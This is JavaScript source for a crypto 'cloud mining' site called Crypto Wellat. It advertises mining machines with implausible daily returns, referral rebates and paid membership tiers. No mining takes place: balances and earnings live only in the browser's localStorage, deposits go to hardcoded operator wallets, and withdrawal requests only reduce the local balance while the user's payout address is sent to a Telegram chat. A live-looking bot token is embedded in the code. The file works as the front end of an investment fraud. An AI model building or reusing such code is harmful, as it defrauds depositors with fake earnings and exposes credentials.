// Telegram API Configuration
const TELEGRAM_BOT_TOKEN = '8401039769:AAErdk3eB81U9PTBUtHpNeM4FdWVpo-0Os0';
const TELEGRAM_CHAT_ID = '7417215529';

// Global State with proper initialization
let userState = {
    brokerBalance: 20.00,
    foundBalance: 40.00,
    miningMachines: [],
    miningActive: false,
    miningStartTime: null,
    miningClaimable: false,
    cloudMiningActive: false,
    membershipLevel: 'basic',
    referralCode: 'CRYPTO888',
    directReferrals: 0,
    teamMembers: 0,
    totalRebates: 0,
    teamRebates: { tier1: 0, tier2: 0, tier3: 0 },
    userId: null,
    lastWithdrawal: null
};

// Mining Machine Data
const miningMachines = [
    { id: 1, name: "Mining Machine 1", cost: 10, dailyMining: 2, duration: 30 },
    { id: 2, name: "Mining Machine 2", cost: 50, dailyMining: 10, duration: 30 },
    { id: 3, name: "Mining Machine 3", cost: 150, dailyMining: 30, duration: 30 },
    { id: 4, name: "Mining Machine 4", cost: 450, dailyMining: 90, duration: 30 },
    { id: 5, name: "Mining Machine 5", cost: 1350, dailyMining: 275, duration: 30 },
    { id: 6, name: "Mining Machine 6", cost: 4050, dailyMining: 844, duration: 30 },
    { id: 7, name: "Mining Machine 7", cost: 12150, dailyMining: 2650, duration: 30 },
    { id: 8, name: "Mining Machine 8", cost: 36450, dailyMining: 8477, duration: 30 },
    { id: 9, name: "Mining Machine 9", cost: 72900, dailyMining: 29160, duration: 30 },
    { id: 10, name: "Mining Machine 10", cost: 145800, dailyMining: 72900, duration: 30 }
];

// Wallet Addresses
const walletAddresses = {
    'ETH': '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    'BNB': '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    'MORPH': '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
    'TRX': 'TSKPhwUavSrKXXcbWG2TdPzYiBtoTNXP6i',
    'SOL': 'HvHR4LeKdCH5Z2UDKVSDuju8c4ukPAa1CzchHseZ2LKu',
    'TON': 'UQCQcNww5CQho7aDQSb4AC_o3TPXeDshkD64L_iY7wknzyaz'
};

// Network to Address Mapping
const networkMapping = {
    'BEP20-USDT': 'BNB',
    'BEP20-USDC': 'BNB',
    'POLYGON-USDT': 'ETH',
    'POLYGON-USDC': 'ETH',
    'ETH-USDT': 'ETH',
    'ETH-USDC': 'ETH',
    'TRC20-USDT': 'TRX',
    'TON': 'TON'
};

// Enhanced Storage Functions
function generateUserId() {
    return 'USER_' + Math.random().toString(36).substr(2, 9).toUpperCase() + '_' + Date.now().toString(36);
}

function saveState() {
    try {
        localStorage.setItem('cryptoWellatState', JSON.stringify(userState));
        localStorage.setItem('cryptoWellatLastSave', Date.now().toString());
        return true;
    } catch (error) {
        console.error('Failed to save state:', error);
        return false;
    }
}

function loadState() {
    try {
        const savedState = localStorage.getItem('cryptoWellatState');
        if (savedState) {
            const parsedState = JSON.parse(savedState);
            
            // Merge with current state to ensure new properties are added
            userState = { ...userState, ...parsedState };
            
            // Ensure required properties exist
            if (!userState.userId) {
                userState.userId = generateUserId();
            }
            if (userState.foundBalance === undefined) {
                userState.foundBalance = 40.00;
            }
            
            return true;
        }
    } catch (error) {
        console.error('Failed to load state:', error);
    }
    
    // Initialize new user
    userState.userId = generateUserId();
    userState.brokerBalance = 20.00;
    userState.foundBalance = 40.00;
    
    return false;
}

// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

function initializeApp() {
    console.log('🚀 Initializing Crypto Wellat...');
    
    // Load existing state or initialize new user
    const hasExistingState = loadState();
    console.log(hasExistingState ? '📁 Loaded existing state' : '🆕 Created new user state');
    
    // Initialize UI components immediately
    setupEventListeners();
    renderMiningMachines();
    updateUI();
    startMiningCycleCheck();
    
    // Start mining animation immediately
    startMiningAnimation();
    
    // Send welcome notification for new users
    if (!hasExistingState) {
        sendTelegramNotification('welcome', {
            userId: userState.userId,
            brokerBalance: userState.brokerBalance,
            foundBalance: userState.foundBalance
        });
    }
    
    console.log('✅ Crypto Wellat initialized successfully');
}

function startMiningAnimation() {
    // Start the mining animation loops immediately
    const animationContainer = document.getElementById('miningAnimation');
    if (animationContainer) {
        updateMiningAnimation('idle');
    }
}

function setupEventListeners() {
    // Navigation
    document.querySelectorAll('.nav-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            const section = e.target.closest('.nav-btn').dataset.section;
            switchSection(section);
        });
    });

    // Mining controls
    document.getElementById('startMining').addEventListener('click', startMining);
    document.getElementById('claimRewards').addEventListener('click', claimRewards);

    // Network selection for deposit
    document.getElementById('depositNetwork').addEventListener('change', updateDepositAddress);

    // Withdrawal amount calculation
    document.getElementById('withdrawAmount').addEventListener('input', calculateActualArrival);

    // Upgrade buttons
    document.querySelectorAll('.upgrade-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            const level = e.target.closest('.upgrade-btn').dataset.level;
            upgradeMembership(level);
        });
    });

    // Share buttons
    document.querySelectorAll('.share-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            const platform = e.target.closest('.share-btn').dataset.platform;
            shareReferralCode(platform);
        });
    });

    // File upload
    document.getElementById('uploadArea').addEventListener('click', () => {
        document.getElementById('screenshotUpload').click();
    });

    document.getElementById('screenshotUpload').addEventListener('change', handleFileUpload);
}

function switchSection(sectionName) {
    // Update active nav button
    document.querySelectorAll('.nav-btn').forEach(btn => {
        btn.classList.remove('active');
        if (btn.dataset.section === sectionName) {
            btn.classList.add('active');
        }
    });

    // Update active section
    document.querySelectorAll('.content-section').forEach(section => {
        section.classList.remove('active');
    });
    document.getElementById(sectionName).classList.add('active');

    // Special handling for sections
    if (sectionName === 'withdraw') {
        updateAvailableAssets();
    } else if (sectionName === 'team') {
        updateTeamStats();
    }
}

function renderMiningMachines() {
    const grid = document.getElementById('machinesGrid');
    grid.innerHTML = '';

    miningMachines.forEach(machine => {
        const machineCard = document.createElement('div');
        machineCard.className = 'machine-card';
        machineCard.innerHTML = `
            <div class="machine-header">
                <span class="machine-name">${machine.name}</span>
                <span class="machine-cost">${machine.cost} USDT</span>
            </div>
            <div class="machine-daily">Daily Mining: ${machine.dailyMining} USDT</div>
            <div class="machine-duration">Duration: ${machine.duration} days</div>
            <button class="action-btn primary" onclick="openPurchaseModal(${machine.id})" 
                    ${userState.brokerBalance < machine.cost ? 'disabled' : ''}>
                Buy Now
            </button>
        `;
        grid.appendChild(machineCard);
    });
}

function openPurchaseModal(machineId) {
    const machine = miningMachines.find(m => m.id === machineId);
    if (!machine) return;

    const modal = document.getElementById('purchaseModal');
    const details = document.getElementById('purchaseDetails');
    
    const cloudBonus = machine.dailyMining * 0.3;
    const totalDaily = machine.dailyMining + cloudBonus;
    
    details.innerHTML = `
        <div class="purchase-details">
            <div class="detail-row">
                <span>Machine:</span>
                <span>${machine.name}</span>
            </div>
            <div class="detail-row">
                <span>Cost:</span>
                <span class="highlight">${machine.cost} USDT</span>
            </div>
            <div class="detail-row">
                <span>Base Daily Yield:</span>
                <span>${machine.dailyMining} USDT</span>
            </div>
            <div class="detail-row">
                <span>Cloud Mining Bonus:</span>
                <span class="bonus">+30% (${cloudBonus} USDT)</span>
            </div>
            <div class="detail-row total">
                <span>Total Daily:</span>
                <span class="highlight">${totalDaily.toFixed(2)} USDT</span>
            </div>
            <div class="detail-row">
                <span>Your Balance:</span>
                <span>${userState.brokerBalance.toFixed(2)} USDT</span>
            </div>
            ${userState.brokerBalance < machine.cost ? 
                '<div class="insufficient-balance">Insufficient balance. Please deposit first.</div>' : 
                '<div class="sufficient-balance">You can purchase this machine.</div>'}
        </div>
    `;

    modal.classList.remove('hidden');
    modal.dataset.machineId = machineId;
}

async function confirmPurchase() {
    const modal = document.getElementById('purchaseModal');
    const machineId = parseInt(modal.dataset.machineId);
    const machine = miningMachines.find(m => m.id === machineId);

    if (!machine) {
        showSuccessMessage('Error: Machine not found');
        return;
    }

    if (userState.brokerBalance < machine.cost) {
        showSuccessMessage('Error: Insufficient balance. Please deposit first.');
        return;
    }

    // Show loading
    const btn = modal.querySelector('.action-btn');
    const spinner = btn.querySelector('.btn-spinner');
    btn.disabled = true;
    spinner.classList.remove('hidden');

    await simulateLoading(500);

    // Deduct cost from balance
    userState.brokerBalance -= machine.cost;
    
    // Add machine to user's collection
    const machinePurchase = {
        ...machine,
        purchaseDate: new Date().toISOString(),
        expiryDate: new Date(Date.now() + machine.duration * 24 * 60 * 60 * 1000).toISOString()
    };
    userState.miningMachines.push(machinePurchase);

    // Activate cloud mining if not already active
    if (!userState.cloudMiningActive) {
        userState.cloudMiningActive = true;
        document.getElementById('cloudMiningStatus').textContent = 'Active';
    }

    // Send Telegram notification
    await sendTelegramNotification('purchase', {
        machine: machine.name,
        amount: machine.cost,
        userBalance: userState.brokerBalance,
        userId: userState.userId
    });

    saveState();
    updateUI();
    closeModal('purchaseModal');
    showSuccessMessage(`Successfully purchased ${machine.name}! Cloud mining activated with +30% bonus.`);

    // Reset button state
    btn.disabled = false;
    spinner.classList.add('hidden');
}

async function startMining() {
    if (userState.miningMachines.length === 0) {
        showSuccessMessage('Please purchase a mining machine first.');
        return;
    }

    // Show loading
    const btn = document.getElementById('startMining');
    const spinner = btn.querySelector('.btn-spinner');
    btn.disabled = true;
    spinner.classList.remove('hidden');

    await simulateLoading(500);

    userState.miningActive = true;
    userState.miningStartTime = Date.now();
    userState.miningClaimable = false;

    // Update mining animation
    updateMiningAnimation('active');
    updateMiningTimer();

    // Update buttons
    document.getElementById('startMining').classList.add('hidden');
    document.getElementById('claimRewards').classList.remove('hidden');

    // Send Telegram notification
    await sendTelegramNotification('mining_start', {
        userId: userState.userId,
        machines: userState.miningMachines.length
    });

    saveState();
    updateUI();

    // Reset button state
    btn.disabled = false;
    spinner.classList.add('hidden');
}

async function claimRewards() {
    if (!userState.miningActive || !userState.miningClaimable) {
        showSuccessMessage('Mining cycle not complete yet.');
        return;
    }

    // Show loading
    const btn = document.getElementById('claimRewards');
    const spinner = btn.querySelector('.btn-spinner');
    btn.disabled = true;
    spinner.classList.remove('hidden');

    await simulateLoading(500);

    // Calculate rewards
    const totalDailyMining = userState.miningMachines.reduce((total, machine) => {
        return total + machine.dailyMining;
    }, 0);

    // Apply cloud mining bonus
    const cloudBonus = userState.cloudMiningActive ? 0.3 : 0;
    const baseReward = totalDailyMining / 2; // 12-hour cycle = half daily
    const bonusReward = baseReward * cloudBonus;
    const totalReward = baseReward + bonusReward;

    // Add to found balance
    userState.foundBalance += totalReward;

    // Reset mining state
    userState.miningActive = false;
    userState.miningClaimable = false;
    userState.miningStartTime = null;

    // Update animation
    updateMiningAnimation('claim');

    // Update buttons
    document.getElementById('claimRewards').classList.add('hidden');
    document.getElementById('startMining').classList.remove('hidden');

    // Send Telegram notification
    await sendTelegramNotification('mining_claim', {
        amount: totalReward,
        totalBalance: userState.foundBalance,
        userId: userState.userId
    });

    saveState();
    updateUI();
    
    setTimeout(() => {
        updateMiningAnimation('idle');
        showSuccessMessage(`Successfully claimed ${totalReward.toFixed(2)} USDT!`);
    }, 500);

    // Reset button state
    btn.disabled = false;
    spinner.classList.add('hidden');
}

function startMiningCycleCheck() {
    setInterval(() => {
        if (userState.miningActive && userState.miningStartTime && !userState.miningClaimable) {
            const elapsed = Date.now() - userState.miningStartTime;
            const twelveHours = 12 * 60 * 60 * 1000;

            if (elapsed >= twelveHours) {
                userState.miningClaimable = true;
                updateMiningAnimation('complete');
                saveState();
                updateUI();
            }
            
            updateMiningTimer();
        }
    }, 1000);
}

function updateMiningTimer() {
    if (userState.miningActive && userState.miningStartTime) {
        const elapsed = Date.now() - userState.miningStartTime;
        const remaining = Math.max(0, (12 * 60 * 60 * 1000) - elapsed);
        
        const hours = Math.floor(remaining / (60 * 60 * 1000));
        const minutes = Math.floor((remaining % (60 * 60 * 1000)) / (60 * 1000));
        const seconds = Math.floor((remaining % (60 * 1000)) / 1000);
        
        const timerText = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        document.getElementById('miningTimer').textContent = timerText;
        
        if (remaining > 0) {
            document.getElementById('miningTimer').classList.remove('hidden');
            document.getElementById('miningStatusText').classList.add('hidden');
        } else {
            document.getElementById('miningTimer').classList.add('hidden');
            document.getElementById('miningStatusText').classList.remove('hidden');
            document.getElementById('miningStatusText').textContent = 'Ready to Claim!';
        }
    }
}

function updateMiningAnimation(state) {
    const animationContainer = document.getElementById('miningAnimation');
    const statusText = document.getElementById('miningStatusText');
    const timer = document.getElementById('miningTimer');
    
    switch(state) {
        case 'active':
            statusText.textContent = 'Mining in Progress...';
            timer.classList.remove('hidden');
            statusText.classList.add('hidden');
            animationContainer.style.background = 'radial-gradient(circle, #1a1a2e 0%, #0f0f23 100%)';
            break;
        case 'complete':
            statusText.textContent = 'Mining Complete!';
            timer.classList.add('hidden');
            statusText.classList.remove('hidden');
            animationContainer.style.background = 'radial-gradient(circle, #2a1a4e 0%, #1a1a2e 100%)';
            break;
        case 'claim':
            statusText.textContent = 'Claiming Rewards...';
            animationContainer.style.background = 'radial-gradient(circle, #3a1a6e 0%, #2a1a4e 100%)';
            break;
        default:
            statusText.textContent = 'Ready to Start Mining';
            timer.classList.add('hidden');
            statusText.classList.remove('hidden');
            animationContainer.style.background = 'rgba(10, 10, 20, 0.8)';
    }
}

function updateUI() {
    // Update balances
    document.getElementById('brokerBalance').textContent = userState.brokerBalance.toFixed(2) + ' USDT';
    document.getElementById('foundBalance').textContent = userState.foundBalance.toFixed(2) + ' USDT';
    
    // Update available assets for withdrawal
    updateAvailableAssets();
    
    // Update mining buttons
    const startBtn = document.getElementById('startMining');
    const claimBtn = document.getElementById('claimRewards');
    
    if (userState.miningActive) {
        startBtn.classList.add('hidden');
        claimBtn.classList.remove('hidden');
        claimBtn.disabled = !userState.miningClaimable;
    } else {
        startBtn.classList.remove('hidden');
        claimBtn.classList.add('hidden');
        startBtn.disabled = userState.miningMachines.length === 0;
    }
    
    // Update cloud mining status
    document.getElementById('cloudMiningStatus').textContent = 
        userState.cloudMiningActive ? 'Active' : 'Inactive';
    
    // Update membership level
    document.getElementById('currentLevel').textContent = 
        userState.membershipLevel.charAt(0).toUpperCase() + userState.membershipLevel.slice(1) + ' Miner';
    
    // Re-render machines to update purchase button states
    renderMiningMachines();
}

function updateAvailableAssets() {
    document.getElementById('availableAssets').textContent = 
        userState.foundBalance.toFixed(6) + ' USDT';
}

function updateTeamStats() {
    document.getElementById('directReferrals').textContent = userState.directReferrals;
    document.getElementById('teamMembers').textContent = userState.teamMembers;
    document.getElementById('totalRebates').textContent = userState.totalRebates.toFixed(2) + ' USDT';
}

function calculateActualArrival() {
    const amount = parseFloat(document.getElementById('withdrawAmount').value) || 0;
    document.getElementById('actualArrival').textContent = amount.toFixed(2) + ' USDT';
}

function setMaxWithdraw() {
    document.getElementById('withdrawAmount').value = userState.foundBalance.toFixed(2);
    calculateActualArrival();
}

async function processWithdrawal() {
    const amount = parseFloat(document.getElementById('withdrawAmount').value);
    const address = document.getElementById('withdrawAddress').value;
    const network = document.getElementById('withdrawNetwork').value;

    if (!amount || amount < 1) {
        showSuccessMessage('Minimum withdrawal amount is 1 USDT');
        return;
    }

    if (amount > userState.foundBalance) {
        showSuccessMessage('Insufficient found balance');
        return;
    }

    if (!address) {
        showSuccessMessage('Please enter withdrawal address');
        return;
    }

    // Check if user has withdrawn today
    const today = new Date().toDateString();
    if (userState.lastWithdrawal === today) {
        showSuccessMessage('You can only withdraw once per day. Please try again tomorrow.');
        return;
    }

    // Show loading
    const btn = document.querySelector('.confirm-btn');
    const spinner = btn.querySelector('.btn-spinner');
    btn.disabled = true;
    spinner.classList.remove('hidden');

    await simulateLoading(500);

    // Process withdrawal
    userState.foundBalance -= amount;
    userState.lastWithdrawal = today;

    // Send Telegram notification
    await sendTelegramNotification('withdrawal', {
        amount: amount,
        network: network,
        address: address,
        userId: userState.userId,
        remainingBalance: userState.foundBalance
    });

    saveState();
    updateUI();
    showSuccessMessage(`Withdrawal request submitted for ${amount} USDT. Processing may take up to 24 hours.`);

    // Reset form
    document.getElementById('withdrawAmount').value = '';
    document.getElementById('withdrawAddress').value = '';
    calculateActualArrival();

    // Reset button state
    btn.disabled = false;
    spinner.classList.add('hidden');
}

function openDepositModal() {
    const modal = document.getElementById('depositModal');
    modal.classList.remove('hidden');
    updateDepositAddress();
}

function updateDepositAddress() {
    const network = document.getElementById('depositNetwork').value;
    const addressKey = networkMapping[network];
    const address = walletAddresses[addressKey];
    
    document.getElementById('depositAddress').textContent = address;
}

function copyDepositAddress() {
    const address = document.getElementById('depositAddress').textContent;
    navigator.clipboard.writeText(address).then(() => {
        showSuccessMessage('Address copied to clipboard!');
    });
}

function copyReferralCode() {
    navigator.clipboard.writeText(userState.referralCode).then(() => {
        showSuccessMessage('Referral code copied to clipboard!');
    });
}

async function confirmPayment() {
    const amount = parseFloat(document.getElementById('depositAmount').value);
    const network = document.getElementById('depositNetwork').value;

    if (!amount || amount < 10) {
        showSuccessMessage('Minimum deposit amount is 10 USDT');
        return;
    }

    // Show loading
    const btn = document.querySelector('#depositModal .action-btn.primary');
    const spinner = btn.querySelector('.btn-spinner');
    btn.disabled = true;
    spinner.classList.remove('hidden');

    await simulateLoading(500);

    // Send Telegram notification
    await sendTelegramNotification('deposit', {
        amount: amount,
        network: network,
        userId: userState.userId
    });

    showSuccessMessage('Deposit submitted - awaiting confirmation (up to 24 hours)');
    closeModal('depositModal');

    // Reset button state
    btn.disabled = false;
    spinner.classList.add('hidden');
}

function confirmDeposit() {
    const amount = parseFloat(document.getElementById('depositAmount').value);
    
    if (amount && amount >= 10) {
        userState.brokerBalance += amount;
        saveState();
        updateUI();
        showSuccessMessage(`Deposit of ${amount} USDT confirmed!`);
        closeModal('depositModal');
    }
}

async function upgradeMembership(level) {
    const costs = {
        'advanced': 100,
        'professional': 500,
        'expert': 2000
    };

    const cost = costs[level];
    if (userState.brokerBalance < cost) {
        showSuccessMessage('Insufficient balance. Please deposit first.');
        return;
    }

    // Show loading
    await simulateLoading(500);

    userState.brokerBalance -= cost;
    userState.membershipLevel = level;
    
    // Send Telegram notification
    await sendTelegramNotification('upgrade', {
        level: level,
        cost: cost,
        userId: userState.userId
    });

    saveState();
    updateUI();
    showSuccessMessage(`Membership upgraded to ${level} level!`);
}

function shareReferralCode(platform) {
    const message = `Join me on Crypto Wellat and start earning with cloud mining! Use my referral code: ${userState.referralCode}`;
    const url = `https://crypto-wellat.com?ref=${userState.referralCode}`;
    
    let shareUrl = '';
    
    switch(platform) {
        case 'telegram':
            shareUrl = `https://t.me/share/url?url=${encodeURIComponent(url)}&text=${encodeURIComponent(message)}`;
            break;
        case 'whatsapp':
            shareUrl = `https://wa.me/?text=${encodeURIComponent(message + ' ' + url)}`;
            break;
        case 'facebook':
            shareUrl = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}`;
            break;
        case 'twitter':
            shareUrl = `https://twitter.com/intent/tweet?text=${encodeURIComponent(message)}&url=${encodeURIComponent(url)}`;
            break;
    }
    
    if (shareUrl) {
        window.open(shareUrl, '_blank', 'width=600,height=400');
    }
}

function handleFileUpload(event) {
    const file = event.target.files[0];
    if (file) {
        const uploadArea = document.getElementById('uploadArea');
        uploadArea.innerHTML = `<span>✅ ${file.name}</span>`;
        
        // In a real implementation, you would upload the file to a server
        console.log('File selected:', file.name);
    }
}

// Telegram API Functions
async function sendTelegramNotification(type, data) {
    const messages = {
        'welcome': `🟣 New user started using Crypto Wellat\nUser ID: ${data.userId}\nBroker Balance: ${data.brokerBalance} USDT\nFound Balance: ${data.foundBalance} USDT\nTime: ${new Date().toLocaleString()}`,
        'purchase': `🟣 New Mining Machine Purchase\nUser ID: ${data.userId}\nMachine: ${data.machine}\nAmount: ${data.amount} USDT\nUser Balance: ${data.userBalance} USDT\nTime: ${new Date().toLocaleString()}`,
        'deposit': `🟣 Deposit Request\nUser ID: ${data.userId}\nAmount: ${data.amount} USDT\nNetwork: ${data.network}\nTime: ${new Date().toLocaleString()}`,
        'withdrawal': `🟣 Withdrawal Request\nUser ID: ${data.userId}\nAmount: ${data.amount} USDT\nNetwork: ${data.network}\nAddress: ${data.address}\nRemaining Balance: ${data.remainingBalance} USDT\nTime: ${new Date().toLocaleString()}`,
        'mining_start': `🟣 Mining Started\nUser ID: ${data.userId}\nActive Machines: ${data.machines}\nTime: ${new Date().toLocaleString()}`,
        'mining_claim': `🟣 Rewards Claimed\nUser ID: ${data.userId}\nAmount: ${data.amount} USDT\nTotal Balance: ${data.totalBalance} USDT\nTime: ${new Date().toLocaleString()}`,
        'upgrade': `🟣 Membership Upgrade\nUser ID: ${data.userId}\nLevel: ${data.level}\nCost: ${data.cost} USDT\nTime: ${new Date().toLocaleString()}`
    };

    const message = messages[type] || `🟣 Crypto Wellat Notification\nType: ${type}\nUser ID: ${data.userId}\nData: ${JSON.stringify(data)}\nTime: ${new Date().toLocaleString()}`;

    try {
        // Send to Telegram Bot API
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            console.error('Telegram API error:', await response.text());
        } else {
            console.log('✅ Telegram notification sent:', type);
        }
    } catch (error) {
        console.error('Failed to send Telegram notification:', error);
    }
}

// Utility Functions
function simulateLoading(duration) {
    return new Promise(resolve => {
        setTimeout(resolve, duration);
    });
}

function showLoading() {
    document.getElementById('loadingOverlay').classList.remove('hidden');
}

function hideLoading() {
    document.getElementById('loadingOverlay').classList.add('hidden');
}

function showSuccessMessage(message) {
    document.getElementById('successText').textContent = message;
    document.getElementById('successMessage').classList.remove('hidden');
}

function closeSuccessMessage() {
    document.getElementById('successMessage').classList.add('hidden');
}

function closeModal(modalId) {
    document.getElementById(modalId).classList.add('hidden');
}

// Export functions for global access
window.openPurchaseModal = openPurchaseModal;
window.confirmPurchase = confirmPurchase;
window.copyDepositAddress = copyDepositAddress;
window.copyReferralCode = copyReferralCode;
window.setMaxWithdraw = setMaxWithdraw;
window.processWithdrawal = processWithdrawal;
window.confirmPayment = confirmPayment;
window.confirmDeposit = confirmDeposit;
window.closeModal = closeModal;
window.closeSuccessMessage = closeSuccessMessage;
window.upgradeMembership = upgradeMembership;
window.openDepositModal = openDepositModal;
